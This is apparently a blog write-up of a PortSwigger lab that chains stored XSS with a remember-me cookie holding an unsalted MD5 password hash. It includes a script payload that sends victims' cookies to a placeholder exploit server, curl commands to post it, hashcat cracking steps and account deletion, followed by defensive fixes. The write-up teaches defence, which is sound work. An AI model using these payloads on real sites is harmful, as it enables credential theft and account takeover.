---
layout: post
title: "PortSwigger: Offline Password Cracking"
date: 2027-12-09 09:00:00 -0500
categories: [Web Security, Authentication]
tags: [portswigger, authentication, xss, stored-xss, password-hash, hashcat, md5, cookie, web]
---

## Lab Summary

**Lab:** Offline password cracking
**Difficulty:** Practitioner
**Vulnerability:** Password hash stored in a client-side cookie ([CWE-539](https://cwe.mitre.org/data/definitions/539.html) / [CWE-312](https://cwe.mitre.org/data/definitions/312.html)) with an unsalted [MD5 hash](https://cwe.mitre.org/data/definitions/916.html), stolen via [stored cross-site scripting](https://cwe.mitre.org/data/definitions/79.html).

## Overview

This blog application offers a "Stay logged in" feature backed by a cookie that *is* the user's
credential rather than an opaque session token. The comment box is also vulnerable to stored XSS,
and the credential cookie is not flagged `HttpOnly`. Chaining the two lets us steal the victim's
cookie, crack the embedded password hash offline, log in as them, and delete their account.

## The technique

When you tick "Stay logged in", the app sets:

```
stay-logged-in = base64( username + ":" + md5(password) )
```

That is a persistent, client-held credential. Because it's only base64-*encoded* (not encrypted) and
the hash is a fast, unsalted MD5, anyone who reads the cookie can recover the plaintext password
offline. And because the cookie is missing the `HttpOnly` flag, JavaScript running in the victim's
browser can read it with `document.cookie` — turning the comment-box XSS into full credential theft.

## Solution

**1. Confirm the cookie format.** Log in as `wiener:peter` with "Stay logged in" checked and decode
the cookie — it is `username:md5(password)`:

```bash
echo -n d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw | base64 -d
# wiener:51dc30ddc473d43a6011e9ebba6ca770   (= md5("peter"))
```

**2. Post a stored-XSS comment** that exfiltrates each viewer's cookies to your exploit server:

```html
<script>document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie</script>
```

```bash
curl -sk 'https://TARGET/post/comment' \
  --data-urlencode 'postId=6' \
  --data-urlencode "comment=<script>document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie</script>" \
  --data-urlencode 'name=x' --data-urlencode 'email=x@x.com' --data-urlencode 'website=http://x.com'
```

**3. Read the stolen cookie** from the exploit-server access log after the victim bot views the post:

```bash
curl -sk 'https://YOUR-EXPLOIT-SERVER/log' | grep stay-logged-in
# stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

**4. Decode and crack the hash offline** with hashcat:

```bash
echo -n Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz | base64 -d | cut -d: -f2 > carlos.hash
hashcat -m 0 -a 0 carlos.hash /usr/share/wordlists/rockyou.txt --quiet
# 26323c16d5f4dabff3bb136f2460a943:<redacted>
```

**5. Take over and solve.** Log in as `carlos` with the cracked password, then delete the account.
The deletion is a two-step confirmation — the first POST returns an "Are you sure?" page whose form
asks for the password again, so submit it to `/my-account/delete`:

```bash
curl -sk 'https://TARGET/my-account/delete' -b carlos_cookies.txt \
  --data-urlencode 'password=<redacted>'
# HTTP/2 302  ->  Location: /
```

The lab flips to **Solved**.

## Why it worked

The application authenticates its persistent session off a value the client holds — and that value is
a hash of the password itself. Storing a credential in the cookie ([CWE-539](https://cwe.mitre.org/data/definitions/539.html)) means reading the cookie
is equivalent to stealing the password, and an unsalted single-round MD5 ([CWE-916](https://cwe.mitre.org/data/definitions/916.html)) falls to a
wordlist in milliseconds. The missing `HttpOnly` flag combined with an unencoded comment sink
([stored XSS](https://cwe.mitre.org/data/definitions/79.html)) gave an attacker a way to read that cookie out of a victim's browser.

## Fix / defense

- **Don't put credentials in the cookie.** Issue an opaque random token, store its hash server-side,
  and look the user up per request. The token should be revocable and unrelated to the password.
- **Set `HttpOnly` and `Secure`** on session and remember-me cookies so XSS cannot read them.
- **Fix the XSS at the sink** — HTML-encode comment output so `<script>` can never execute.
- If passwords must be hashed, use a slow, salted algorithm (bcrypt/argon2), never bare MD5.
